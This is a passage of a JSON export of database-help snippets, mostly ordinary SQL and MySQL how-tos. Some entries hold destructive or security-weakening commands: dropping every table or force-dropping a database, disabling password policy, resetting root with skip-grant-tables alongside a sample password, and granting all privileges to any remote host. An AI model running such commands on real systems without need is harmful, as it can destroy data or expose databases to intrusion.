    "reg_date": "2021-10-12T09:53:54.000Z"
  },
  {
    "id": 210,
    "keyword": null,
    "link": null,
    "title": " SQL GOTO EXAMPLE",
    "description": "DECLARE @Counter int;   SET @Counter = 1;   WHILE @Counter < 10   BEGIN        SELECT @Counter       SET @Counter = @Counter + 1       IF @Counter = 4 GOTO Branch_One --Jumps to the first branch.       IF @Counter = 5 GOTO Branch_Two  --This will never execute.   END   Branch_One:       SELECT 'Jumping To Branch One.'       GOTO Branch_Three; --This will prevent Branch_Two from executing.   Branch_Two:       SELECT 'Jumping To Branch Two.'   Branch_Three:       SELECT 'Jumping To Branch Three.';   \n",
    "reg_date": "2021-10-12T09:53:54.000Z"
  },
  {
    "id": 211,
    "keyword": null,
    "link": null,
    "title": " SQL Integer devision",
    "description": "-- When performing division operations on integer values,  -- the results will always be integers and the results  -- may not always be what you expect.  SELECT 1 / 2; --> Result: 0 SELECT 1.0 / 2; --> Result: 0.5 SELECT CAST(1 AS REAL) / 2; --> Result: 0.5 SELECT 17 / 5; --> Result: 3 SELECT 17 % 5; --> Result: 2  -- Remember, these are integers and so the result will  -- be an integer and 1.0 is not an integer.\n",
    "reg_date": "2021-10-12T09:53:54.000Z"
  },
  {
    "id": 212,
    "keyword": null,
    "link": null,
    "title": " SQL Query to delete all the tables in a database",
    "description": "BY LOVE  EXEC sp_msforeachtable \"ALTER TABLE ? NOCHECK CONSTRAINT all\" DECLARE @sql NVARCHAR(max)=''  SELECT @sql += ' Drop table ' + QUOTENAME(TABLE_SCHEMA) + '.'+ QUOTENAME(TABLE_NAME) + '; ' FROM   INFORMATION_SCHEMA.TABLES WHERE  TABLE_TYPE = 'BASE TABLE' Exec Sp_executesql @sql \n",
    "reg_date": "2021-10-12T09:53:54.000Z"
  },
  {
    "id": 213,
    "keyword": null,
    "link": null,
    "title": " SQL SELECT TOP Equivalent in oracal",
    "description": "syntax -> SELECT column_name(s) FROM table_name WHERE ROWNUM <= number  ////example/// SELECT * FROM Persons WHERE ROWNUM <=5 \nIn MySQL, top 50 rows are displayed by using this following query: SELECT * FROM LIMIT 0, 50;\n",
    "reg_date": "2021-10-12T09:53:54.000Z"
  },
  {
    "id": 214,
    "keyword": null,
    "link": null,
    "title": " SQL SERVER SELECT BETWEEN DATETIME",
    "description": "select *  from blah  where DatetimeField between '22/02/2009 09:00:00.000' and '23/05/2009 10:30:00.000' \n",
    "reg_date": "2021-10-12T09:53:54.000Z"
  },
  {
    "id": 215,
    "keyword": null,
    "link": null,
    "title": " SQL Server escape single quote dynamic SQL",
    "description": "select 'that''s it' \n",
    "reg_date": "2021-10-12T09:53:54.000Z"
  },
  {
    "id": 216,
    "keyword": null,
    "link": null,
    "title": " SQL Server format datetime",
    "description": "SELECT FORMAT(CURRENT_TIMESTAMP, 'yyyy-MM-dd hh:mm:ss tt') \nDATE - format YYYY-MM-DD DATETIME - format: YYYY-MM-DD HH:MI:SS TIMESTAMP - format: YYYY-MM-DD HH:MI:SS YEAR - format YYYY or YY\n",
    "reg_date": "2021-10-12T09:53:54.000Z"
  },
  {
    "id": 217,
    "keyword": null,
    "link": null,
    "title": " SQL Server reset ID",
    "description": "\tDBCC CHECKIDENT ('table name', RESEED , 0)\nDBCC CHECKIDENT ('[TestTable]', RESEED, 0); GO \nUSE <databasename>;   GO   DBCC CHECKIDENT ('<tablename>.<columnname>', <value>, <incrementby>);   GO \n",
    "reg_date": "2021-10-12T09:53:54.000Z"
  },
  {
    "id": 218,
    "keyword": null,
    "link": null,
    "title": " SQL Update-Klausel",
    "description": "Mit UPATE werden  Datenwerte in der Datenbank aktualisiert. Nach Bed&uuml;rfnis k&ouml;nnen auch mehrere Datens&auml;tze auf einmal ver&auml;ndert werden. Mit WHERE  werden nur bestimmte Datens&auml;tze zu aktualisiert.    UPDATE suppliers       SET supplier_id = 50,       supplier_name = 'Apple',       city = 'Cupertino'   WHERE       supplier_name = 'Google'; \n",
    "reg_date": "2021-10-12T09:53:55.000Z"
  },
  {
    "id": 219,
    "keyword": null,
    "link": null,
    "title": " SQL Update",
    "description": "--update query example  UPDATE table_name  SET column1 = value1, column2 = value2, ...  WHERE condition; \nUPDATE employees  SET      address = '1300 Carter St',     city = 'San Jose',     postalcode = 95125,     region = 'CA' WHERE     employeeID = 3; \nMit UPATE werden  Datenwerte in der Datenbank aktualisiert. Nach Bed&uuml;rfnis k&ouml;nnen auch mehrere Datens&auml;tze auf einmal ver&auml;ndert werden. Mit WHERE werden nur bestimmte Datens&auml;tze zu aktualisiert.    UPDATE suppliers       SET supplier_id = 50,       supplier_name = 'Apple',       city = 'Cupertino'   WHERE       supplier_name = 'Google'; \nUpdates existing data in a table. Example: Updates the mileage and serviceDue values for a vehicle with an id of 45 in the cars table. UPDATE cars SET mileage = 23500, serviceDue = 0 WHERE id = 45;\n/*Swap f to m and m to f*/ UPDATE salary SET     sex = CASE sex         WHEN 'm' THEN 'f'         ELSE 'm'     END;\nUPDATE computer SET cores = {}, cpu_speed = {}, ram = {}, cost = {} WHERE name = '{}' \n",
    "reg_date": "2021-10-12T09:53:55.000Z"
  },
  {
    "id": 220,
    "keyword": null,
    "link": null,
    "title": " SQL cheat sheet pdf",
    "description": "Guys, are you looking for SQL cheatsheet, in pdf format :)  -> https://buggyprogrammer.com/sql-cheatsheet/\n# Finding Data Queries  # SELECT: used to select data from a database SELECT * FROM table_name;  # DISTINCT: filters away duplicate values and returns rows of specified column SELECT DISTINCT column_name;  # WHERE: used to filter records/rows SELECT column1, column2 FROM table_name WHERE condition; SELECT * FROM table_name WHERE condition1 AND condition2; SELECT * FROM table_name WHERE condition1 OR condition2; SELECT * FROM table_name WHERE NOT condition; SELECT * FROM table_name WHERE condition1 AND (condition2 OR condition3); SELECT * FROM table_name WHERE EXISTS (SELECT column_name FROM table_name WHERE condition);  # ORDER BY: used to sort the result-set in ascending or descending order SELECT * FROM table_name ORDER BY column; SELECT * FROM table_name ORDER BY column DESC; SELECT * FROM table_name ORDER BY column1 ASC, column2 DESC; SELECT TOP: used to specify the number of records to return from top of table SELECT TOP number columns_names FROM table_name WHERE condition; SELECT TOP percent columns_names FROM table_name WHERE condition;  # Not all database systems support SELECT TOP. The MySQL equivalent is the LIMIT clause SELECT column_names FROM table_name LIMIT offset, count;  # LIKE: operator used in a WHERE clause to search for a specific pattern in a column # % (percent sign) is a wildcard character that represents zero, one, or multiple characters # _ (underscore) is a wildcard character that represents a single character SELECT column_names FROM table_name WHERE column_name LIKE pattern;  LIKE &lsquo;a%&rsquo; # (find any values that start with &ldquo;a&rdquo;) LIKE &lsquo;%a&rsquo; # (find any values that end with &ldquo;a&rdquo;) LIKE &lsquo;%or%&rsquo; # (find any values that have &ldquo;or&rdquo; in any position) LIKE &lsquo;_r%&rsquo; # (find any values that have &ldquo;r&rdquo; in the second position) LIKE &lsquo;a_%_%&rsquo; # (find any values that start with &ldquo;a&rdquo; and are at least 3 characters in length) LIKE &lsquo;[a-c]%&rsquo; # (find any values starting with &ldquo;a&rdquo;, &ldquo;b&rdquo;, or &ldquo;c&rdquo;  # See more in the source link\n",
    "reg_date": "2021-10-12T09:53:55.000Z"
  },
  {
    "id": 221,
    "keyword": null,
    "link": null,
    "title": " SQL check if record exist",
    "description": "SELECT column_name(s) FROM table_name WHERE EXISTS (SELECT column_name FROM table_name WHERE condition);\n",
    "reg_date": "2021-10-12T09:53:55.000Z"
  },
  {
    "id": 222,
    "keyword": null,
    "link": null,
    "title": " SQL create a new table",
    "description": "# Simple table describing a vehicle  CREATE TABLE vehicle(   \t# vehicleId: Unique ID for Primary Key.   \t# This is how we will reference a record \tvehicleId INT NOT NULL,     \tmake VARCHAR(64), # String 64 chars max   \tmodel VARCHAR(128),   \tderivative VARCHAR(255),   \tPRIMARY KEY(vehicleId) );  # Add a record INSERT INTO vehicle VALUES(1000,'Volkswagen','Golf','1.5 TSI EVO Match Edition 5dr');\nCREATE TABLE table_name ( column1 TYPE [COLUMN CONSTRAINTS], column2 TYPE [COLUMN CONSTRAINTS], column3 TYPE [COLUMN CONSTRAINTS], [TABLE CONSTRAINTS...] );\nCREATE TABLE utilisateur (     id INT PRIMARY KEY NOT NULL,     nom VARCHAR(100),     prenom VARCHAR(100),     email VARCHAR(255),     date_naissance DATE,     pays VARCHAR(255),     ville VARCHAR(255),     code_postal VARCHAR(5),     nombre_achat INT )\nCREATE TABLE fact ( id SERIAL PRIMARY KEY NOT NULL, type VARCHAR(255), text TEXT );  \nSELECT * INTO newtable FROM oldtable WHERE 1 = 0;\n",
    "reg_date": "2021-10-12T09:53:55.000Z"
  },
  {
    "id": 223,
    "keyword": null,
    "link": null,
    "title": " SQL find text in SP",
    "description": "SELECT DISTINCT        o.name AS Object_Name,        o.type_desc FROM sys.sql_modules m        INNER JOIN        sys.objects o          ON m.object_id = o.object_id WHERE m.definition Like '%[ABD]%'; \n",
    "reg_date": "2021-10-12T09:53:55.000Z"
  },
  {
    "id": 224,
    "keyword": null,
    "link": null,
    "title": " SQL get max per id",
    "description": "select name, max(value) from out_pumptable group by name \n",
    "reg_date": "2021-10-12T09:53:55.000Z"
  },
  {
    "id": 225,
    "keyword": null,
    "link": null,
    "title": " SQL group by having clause",
    "description": "                                                     SELECT     customer_id,     YEAR (order_date),     COUNT (order_id) order_count FROM     sales.orders GROUP BY     customer_id,     YEAR (order_date) HAVING     COUNT (order_id) >= 2 ORDER BY     customer_id; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:53:55.000Z"
  },
  {
    "id": 226,
    "keyword": null,
    "link": null,
    "title": " SQL is not like",
    "description": "SELECT * FROM emp   WHERE name NOT LIKE 'a%'\t\t\t-- not starting with a   AND name NOT LIKE '%a'\t\t\t-- not ending with a   AND name NOT LIKE '%a%'\t\t\t-- not containing  a   AND upper(name) NOT LIKE '%A%'\t-- not containing  a or A\nSELECT * FROM Student WHERE FirstName NOT LIKE '%B%'\n",
    "reg_date": "2021-10-12T09:53:55.000Z"
  },
  {
    "id": 227,
    "keyword": null,
    "link": null,
    "title": " SQL joins in python",
    "description": "This was What I intended  ID Case NxtCase  1    A          2    C          3    E        This is my desired result   ID Case NxtCase  1    A        B  2    C        D  3    E        F   \n",
    "reg_date": "2021-10-12T09:53:55.000Z"
  },
  {
    "id": 228,
    "keyword": null,
    "link": null,
    "title": " SQL nolock",
    "description": "SELECT * FROM LockTestDemo WITH (NOLOCK)\n",
    "reg_date": "2021-10-12T09:53:56.000Z"
  },
  {
    "id": 229,
    "keyword": null,
    "link": null,
    "title": " SQL only show where count is great than 1",
    "description": "SELECT COUNT( * )  FROM agents  HAVING COUNT(*)>1; --count is greater than 1\n",
    "reg_date": "2021-10-12T09:53:56.000Z"
  },
  {
    "id": 230,
    "keyword": null,
    "link": null,
    "title": " SQL order random",
    "description": "SELECT FIELD_NAME FROM TABLE_NAME ORDER BY RAND() LIMIT 1 /* NOTE if this doesnt work try random() */\n",
    "reg_date": "2021-10-12T09:53:56.000Z"
  },
  {
    "id": 231,
    "keyword": null,
    "link": null,
    "title": " SQL print multiple variable",
    "description": "declare @x INT = 1   PRINT 'There are ' + CAST(@x AS VARCHAR) + ' alias combinations did not match a record'\ndeclare @first INT = 1, @second int = 2 PRINT '1st var ' + CAST(@first AS VARCHAR) + ' 2nd var ' + CAST(@second AS VARCHAR)\n",
    "reg_date": "2021-10-12T09:53:56.000Z"
  },
  {
    "id": 232,
    "keyword": null,
    "link": null,
    "title": " SQL query to convert DD/MM/YYYY to YYYY-MM-DD",
    "description": "SELECT CONVERT(varchar(10), CONVERT(date, '13/12/2016', 103), 120)\n",
    "reg_date": "2021-10-12T09:53:56.000Z"
  },
  {
    "id": 233,
    "keyword": null,
    "link": null,
    "title": " SQL rounding numbers",
    "description": "SELECT CAST(ROUND(125.025000, 2) AS NUMERIC(36,2)) returns: 125.03\nSELECT 2.555555; --> Result 2.555555 SELECT ROUND(2.555555); --> Result 3 SELECT ROUND(2.555555, 3); --> Result 2.556 SELECT ROUND(2.555555, 0); --> Result 3\n",
    "reg_date": "2021-10-12T09:53:56.000Z"
  },
  {
    "id": 234,
    "keyword": null,
    "link": null,
    "title": " SQL server query column yes or no",
    "description": "SELECT  a.ID, a.FirstName, a.Lastname,         CASE WHEN COUNT(b.CustID) > 0 THEN 'YES' ELSE 'NO' END AS HasOrders FROM    Customer a         LEFT JOIN Orders b             ON a.ID = b.CustID        -- <<== the linking column on both tables GROUP   BY a.ID, a.FirstName, a.Lastname\n",
    "reg_date": "2021-10-12T09:53:56.000Z"
  },
  {
    "id": 235,
    "keyword": null,
    "link": null,
    "title": " SQLite order random",
    "description": "SELECT FIELD_NAME FROM TABLE_NAME ORDER BY random() LIMIT 1 /* NOTE if this doesnt work try RAND() */\n",
    "reg_date": "2021-10-12T09:53:56.000Z"
  },
  {
    "id": 236,
    "keyword": null,
    "link": null,
    "title": " SQl Server Versionen Releases und Build-Nummern",
    "description": "Release\t\t\t\tBuildversion SQL Server 2019\t\t15.0.4073.23 SQL Server 2017\t\t14.0.1000.169 SQL Server 2016\t\t13.0.1601.5 SQL Server 2014\t\t12.0.2000.8 SQL Server 2012\t\t11.0.2100.60  \n",
    "reg_date": "2021-10-12T09:53:56.000Z"
  },
  {
    "id": 237,
    "keyword": null,
    "link": null,
    "title": " ST SQL is not like",
    "description": "SELECT * FROM Student WHERE FirstName NOT LIKE '%B%'\n",
    "reg_date": "2021-10-12T09:53:56.000Z"
  },
  {
    "id": 238,
    "keyword": null,
    "link": null,
    "title": " Select last row from SQL Table",
    "description": "SELECT * FROM TableName WHERE id=(SELECT max(id) FROM TableName);\n",
    "reg_date": "2021-10-12T09:53:57.000Z"
  },
  {
    "id": 239,
    "keyword": null,
    "link": null,
    "title": " Select without null values sql",
    "description": "SELECT column_names FROM table_name WHERE column_name IS NOT NULL;\n",
    "reg_date": "2021-10-12T09:53:57.000Z"
  },
  {
    "id": 240,
    "keyword": null,
    "link": null,
    "title": " Sounds Like SQL",
    "description": "SELECT * FROM student  WHERE first_name SOUNDS LIKE 'sudipto' ;  \n",
    "reg_date": "2021-10-12T09:53:57.000Z"
  },
  {
    "id": 241,
    "keyword": null,
    "link": null,
    "title": " Sql query to force the database to be drop",
    "description": "BY LOVE SINGH  USE master; GO ALTER DATABASE OnlineRestaurant2  SET SINGLE_USER  WITH ROLLBACK IMMEDIATE; GO DROP DATABASE OnlineRestaurant2; \n",
    "reg_date": "2021-10-12T09:53:57.000Z"
  },
  {
    "id": 242,
    "keyword": null,
    "link": null,
    "title": " Subquery returned more than 1 value. This is not permitted when the subquery follows =, !=, <, <= , >, >= or when the subquery is used as an expression. Live data this error in asp.net",
    "description": "   (select  TOP 1 [FileName] from [dbo].[APP_FinishProductCompleteForm_Attachment] where [finishProductID]=@FinishProductId and FileType='3' ) FileName3,     (select TOP 1 [FileName] from [dbo].[APP_FinishProductCompleteForm_Attachment] where [finishProductID]=@FinishProductId and FileType='4' ) FileName4,     (select TOP 1 [FileName] from [dbo].[APP_FinishProductCompleteForm_Attachment] where [finishProductID]=@FinishProductId and FileType='5' ) FileName5,     (select TOP 1 [FileName] from [dbo].[APP_FinishProductCompleteForm_Attachment] where [finishProductID]=@FinishProductId and FileType='6' ) FileName6,     (select TOP 1 [FileName] from [dbo].[APP_FinishProductCompleteForm_Attachment] where [finishProductID]=@FinishProductId and FileType='7' ) FileName7,     (select TOP 1 finishProductID from [dbo].APP_Raw_Material where [finishProductID]=@FinishProductId ) FinishProductIDRM \n",
    "reg_date": "2021-10-12T09:53:57.000Z"
  },
  {
    "id": 243,
    "keyword": null,
    "link": null,
    "title": " System.Data.SqlClient.SqlException: 'Execution Timeout Expired.  The timeout period elapsed prior to completion of the operation or the server is not responding.' SqlDataAdapter",
    "description": "private void FillInDataGrid(string SQLstring) {     string cn = ConfigurationManager.ConnectionStrings[\"Scratchpad\"].ConnectionString; //hier wordt de databasestring opgehaald     DataSet ds = new DataSet();     // dispose objects that implement IDisposable     using(SqlConnection myConnection = new SqlConnection(cn))     {         SqlDataAdapter dataadapter = new SqlDataAdapter(SQLstring, myConnection);          // set the CommandTimeout         dataadapter.SelectCommand.CommandTimeout = 60;  // seconds          myConnection.Open();         dataadapter.Fill(ds, \"Authors_table\");      }     dataGridView1.DataSource = ds;     dataGridView1.DataMember = \"Authors_table\"; } \n",
    "reg_date": "2021-10-12T09:53:57.000Z"
  },
  {
    "id": 244,
    "keyword": null,
    "link": null,
    "title": " T-SQL / AZURE Reseed",
    "description": "DBCC CHECKIDENT ('[TestTable]', RESEED, 0); GO \n",
    "reg_date": "2021-10-12T09:53:57.000Z"
  },
  {
    "id": 245,
    "keyword": null,
    "link": null,
    "title": " T-SQL Add Column",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE dbo.doc_exa  ADD column_b VARCHAR(20) NULL,  \tcolumn_c INT NULL ;\nALTER TABLE table ADD [COLUMN] column_name;\nALTER TABLE sales.quotations      ADD          amount DECIMAL (10, 2) NOT NULL,         customer_name VARCHAR (50) NOT NULL; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:53:57.000Z"
  },
  {
    "id": 246,
    "keyword": null,
    "link": null,
    "title": " T-SQL Create Trigger",
    "description": "CREATE TRIGGER production.trg_product_audit ON production.products AFTER INSERT, DELETE AS BEGIN     SET NOCOUNT ON;     INSERT INTO production.product_audits(         product_id,          product_name,         brand_id,         category_id,         model_year,         list_price,          updated_at,          operation     )     SELECT         i.product_id,         product_name,         brand_id,         category_id,         model_year,         i.list_price,         GETDATE(),         'INS'     FROM         inserted i     UNION ALL     SELECT         d.product_id,         product_name,         brand_id,         category_id,         model_year,         d.list_price,         GETDATE(),         'DEL'     FROM         deleted d; END Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:53:58.000Z"
  },
  {
    "id": 247,
    "keyword": null,
    "link": null,
    "title": " TSQL GET ALL COLUMNS IN TABLE",
    "description": "/*Get all columns from a table (sql server)*/ SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'table name';\n/* To retreive the column names of table using sql */  SELECT COLUMN_NAME. FROM INFORMATION_SCHEMA. COLUMNS. WHERE TABLE_NAME = 'Your Table Name'\nSELECT   \tTABLE_NAME FROM   \tINFORMATION_SCHEMA.TABLES \n",
    "reg_date": "2021-10-12T09:53:58.000Z"
  },
  {
    "id": 248,
    "keyword": null,
    "link": null,
    "title": " TSQL Insert",
    "description": "INSERT INTO TABLE_NAME [(column1, column2, column3,...columnN)]    VALUES (value1, value2, value3,...valueN); \nINSERT INTO users (first_name, last_name, address, email) VALUES (&lsquo;Tester&rsquo;, &lsquo;Jester&rsquo;, &lsquo;123 Fake Street, Sheffield, United Kingdom&rsquo;, &lsquo;test@lukeharrison.dev&rsquo;);\n",
    "reg_date": "2021-10-12T09:53:58.000Z"
  },
  {
    "id": 249,
    "keyword": null,
    "link": null,
    "title": " The metadata storage is not up to date, please run the sync-metadata-storage command to fix this issue.",
    "description": "  Try changing the DATABASE_URL in .env from  DATABASE_URL=mysql://root:@127.0.0.1:3306/testtest?serverVersion=10.4.11  to  DATABASE_URL=mysql://root:@127.0.0.1:3306/testtest?serverVersion=mariadb-10.4.11 \nDATABASE_URL=mysql://root:@127.0.0.1:3306/testtest?serverVersion=mariadb-10.4.11\n",
    "reg_date": "2021-10-12T09:53:58.000Z"
  },
  {
    "id": 250,
    "keyword": null,
    "link": null,
    "title": " To change the database owner in SQL server",
    "description": "Use OnlineRestaurant exec sp_changedbowner 'sa' \n",
    "reg_date": "2021-10-12T09:53:58.000Z"
  },
  {
    "id": 251,
    "keyword": null,
    "link": null,
    "title": " To count number of rows in SQL table",
    "description": "SELECT count(*) FROM information_schema.columns WHERE table_name = 'Your_table_nale'; \nSELECT COUNT(*) FROM dbo.bigTransactionHistory; \n",
    "reg_date": "2021-10-12T09:53:58.000Z"
  },
  {
    "id": 252,
    "keyword": null,
    "link": null,
    "title": " Transaction count after EXECUTE indicates a mismatching number of BEGIN and COMMIT statements. Previous count = 1, current count = 0",
    "description": "The cause of the error is often mismatch of BEGIN and COMMIT as clearly stated by the error. This means using:  Begin Transaction   Begin     -- your query here   End commit  instead of  Begin   Begin     -- your query here   End commit  omitting Transaction after Begin causes this error!\n",
    "reg_date": "2021-10-12T09:53:58.000Z"
  },
  {
    "id": 253,
    "keyword": null,
    "link": null,
    "title": " Uncaught Error: Call to undefined function DatabaseOld\\mysqli connect()",
    "description": "sudo apt install php-mysqli\n",
    "reg_date": "2021-10-12T09:53:58.000Z"
  },
  {
    "id": 254,
    "keyword": null,
    "link": null,
    "title": " Uncaught Error: Cannot use object of type mysqli result as array",
    "description": "$query = \"SELECT 1\"; $result = $mysqli->query($query); $followingdata = $result->fetch_assoc() \n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 255,
    "keyword": null,
    "link": null,
    "title": " Update information in a mysql column",
    "description": "UPDATE employees  SET      email = 'mary.patterson@classicmodelcars.com' WHERE     employeeNumber = 1056;Code language: SQL (Structured Query Language) (sql)\nUPDATE employees  SET      lastname = 'Hill',     email = 'mary.hill@classicmodelcars.com' WHERE     employeeNumber = 1056;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 256,
    "keyword": null,
    "link": null,
    "title": " UseSqlServer no definition",
    "description": "Install-Package Microsoft.EntityFrameworkCore.SqlServer\n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 257,
    "keyword": null,
    "link": null,
    "title": " User, group, or role 'open' already exists in the current database.",
    "description": "sp_change_users_login 'AUTO_FIX', 'someuser'\n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 258,
    "keyword": null,
    "link": null,
    "title": " ValueError: A string literal cannot contain NUL (0x00) characters.",
    "description": "s.decode(\"utf-8\", errors=\"replace\").replace(\"\\x00\", \"\\uFFFD\") \n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 259,
    "keyword": null,
    "link": null,
    "title": " WHERE not regex in SQL",
    "description": "SELECT FirstName FROM intque.person_tbl WHERE FirstName NOT REGEXP '^[aeiou].*ok$';\n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 260,
    "keyword": null,
    "link": null,
    "title": " What is a Database?",
    "description": "A database is an organized collection of data,  generally stored and accessed electronically  from a computer system. Where databases are  more complex they are often developed  using formal design and modeling techniques.\n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 261,
    "keyword": null,
    "link": null,
    "title": " What is foreign key?",
    "description": "Foreign Key is a non-key attribute which is derived from the primary key  of another table which links those tables together.\n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 262,
    "keyword": null,
    "link": null,
    "title": " What is the default port for MySQL server?",
    "description": "mysql -u root mysql> SHOW GLOBAL VARIABLES LIKE 'PORT'; # Default port is 3306 for MySQL\nThe default port for MySQL server is 3306\nClient - Server Connection Ports Port 3306 is the default port for the classic MySQL protocol \n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 263,
    "keyword": null,
    "link": null,
    "title": " When mysql server would not work in xampp",
    "description": "sudo service mysql stop sudo /opt/lampp/lampp restart \n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 264,
    "keyword": null,
    "link": null,
    "title": " Write a PL/SQL to print even numbers upto 100.",
    "description": "Declare NUM1 number:=0; begin loop NUM1 := NUM1+2; dbms_output.put_line (NUM1||','); exit when NUM1=100; end loop; end;\n",
    "reg_date": "2021-10-12T09:53:59.000Z"
  },
  {
    "id": 265,
    "keyword": null,
    "link": null,
    "title": " Write a query that prints a list of employee names (i.e.: the name attribute) from the Employee table in alphabetical order.",
    "description": "select name from employee order by name;\n",
    "reg_date": "2021-10-12T09:54:00.000Z"
  },
  {
    "id": 266,
    "keyword": null,
    "link": null,
    "title": " Write a query to create an empty table from an existing table?",
    "description": "CREATE TABLE new_table   AS (SELECT *       FROM old_table WHERE 1=2);\n",
    "reg_date": "2021-10-12T09:54:00.000Z"
  },
  {
    "id": 267,
    "keyword": null,
    "link": null,
    "title": " You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'privilleges to",
    "description": "GRANT ALL PRIVILEGES ON * . * TO 'wordpressuser'@'localhost';\n",
    "reg_date": "2021-10-12T09:54:00.000Z"
  },
  {
    "id": 268,
    "keyword": null,
    "link": null,
    "title": " Your password does not satisfy the current policy requirements",
    "description": "mysql> SET GLOBAL validate_password.policy=LOW;\nSHOW VARIABLES LIKE 'validate_password%';\nUNINSTALL COMPONENT 'file://component_validate_password'; \n",
    "reg_date": "2021-10-12T09:54:00.000Z"
  },
  {
    "id": 269,
    "keyword": null,
    "link": null,
    "title": " access denied for user 'root'@'localhost'",
    "description": "sudo mysql  ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root'; \nUPDATE mysql.user SET plugin = 'mysql_native_password' WHERE user = 'root' AND plugin = 'unix_socket'; FLUSH PRIVILEGES;\nUPDATE mysql.user SET plugin = 'mysql_native_password' WHERE user = 'root' AND plugin = 'unix_socket'; FLUSH PRIVILEGES; \nSELECT user,authentication_string,plugin,host FROM mysql.user; ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'Current-Root-Password'; FLUSH PRIVILEGES;\nsudo /etc/init.d/mysql stop  Now start up MySQL in safe mode, so you&rsquo;ll skip the privileges table:  sudo mysqld_safe --skip-grant-tables &     // if you face issue,[mysqld_safe Directory '/var/run/mysqld' for UNIX socket file don't exists] run below commands] start         mkdir -p /var/run/mysqld         chown mysql:mysql /var/run/mysqld     // end   Login with root: mysql -uroot   And assign the DB that needs to be used: use mysql;  SHOW VARIABLES LIKE 'sql_mode'; SET sql_mode = '';  SET PASSWORD FOR root = 'Dehr@dun@345';\t// it is working     update user set password=PASSWORD(\"YOURPASSWORDHERE\") where User='root';         [On MySql 5.7 version you must replace query to:]          update user set authentication_string=PASSWORD(\"YOURPASSWORDHERE\") where user=\"root\";    flush privileges;  quit  sudo /etc/init.d/mysql stop sudo /etc/init.d/mysql start  Now your root password should be working with the one you just set, check it with: mysql -u root -p \n-skip-grant-tables\n",
    "reg_date": "2021-10-12T09:54:00.000Z"
  },
  {
    "id": 270,
    "keyword": null,
    "link": null,
    "title": " access denied for user 'root'@'localhost' (using password no) stackoverflow",
    "description": "-skip-grant-tables\n",
    "reg_date": "2021-10-12T09:54:00.000Z"
  },
  {
    "id": 271,
    "keyword": null,
    "link": null,
    "title": " access denied for user 'root'@'localhost' mariadb",
    "description": "UPDATE mysql.user SET plugin = 'mysql_native_password' WHERE user = 'root' AND plugin = 'unix_socket'; FLUSH PRIVILEGES;\nUPDATE mysql.user SET plugin = 'mysql_native_password' WHERE user = 'root' AND plugin = 'unix_socket'; FLUSH PRIVILEGES; \nSELECT user,authentication_string,plugin,host FROM mysql.user; ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'Current-Root-Password'; FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:54:00.000Z"
  },
  {
    "id": 272,
    "keyword": null,
    "link": null,
    "title": " access denied for user 'root'@'localhost' python sql-connect error",
    "description": "SELECT user,authentication_string,plugin,host FROM mysql.user; ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'Current-Root-Password'; FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:54:00.000Z"
  },
  {
    "id": 273,
    "keyword": null,
    "link": null,
    "title": " access mysql from remote",
    "description": "mysql> CREATE USER 'monty'@'localhost' IDENTIFIED BY 'some_pass'; mysql> GRANT ALL PRIVILEGES ON *.* TO 'monty'@'localhost'     ->     WITH GRANT OPTION; mysql> CREATE USER 'monty'@'%' IDENTIFIED BY 'some_pass'; mysql> GRANT ALL PRIVILEGES ON *.* TO 'monty'@'%'     ->     WITH GRANT OPTION;   #you need to change ufw for allowing 3306 port.  sudo ufw allow 3306  #if you are in aws ec2, you have to change the security group also\n",
    "reg_date": "2021-10-12T09:54:00.000Z"
  },
  {
    "id": 274,
    "keyword": null,
    "link": null,
    "title": " access the postgres psql",
    "description": "psql -h localhost -U username databasename\n",
    "reg_date": "2021-10-12T09:54:00.000Z"
  },
  {
    "id": 275,
    "keyword": null,
    "link": null,
    "title": " add attribute my sql",
    "description": "ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 276,
    "keyword": null,
    "link": null,
    "title": " add auto increment column to existing table mysql",
    "description": "ALTER TABLE `users` ADD `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY  ALTER TABLE `users` ADD `id` INT NOT NULL AUTO_INCREMENT UNIQUE FIRST \nALTER TABLE tbl_access ADD COLUMN `access_id` int(10) NOT NULL PRIMARY KEY AUTO_INCREMENT FIRST \n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 277,
    "keyword": null,
    "link": null,
    "title": " add colum date in sql",
    "description": "ALTER TABLE ADD COLUMN this_date DATE DEFAULT CURRENT_DATE;\n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 278,
    "keyword": null,
    "link": null,
    "title": " add column alter table default value",
    "description": "ALTER TABLE PERSON ADD IS_ACTIVE VARCHAR2(1) DEFAULT 'N' NOT NULL\n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 279,
    "keyword": null,
    "link": null,
    "title": " add column if not exists",
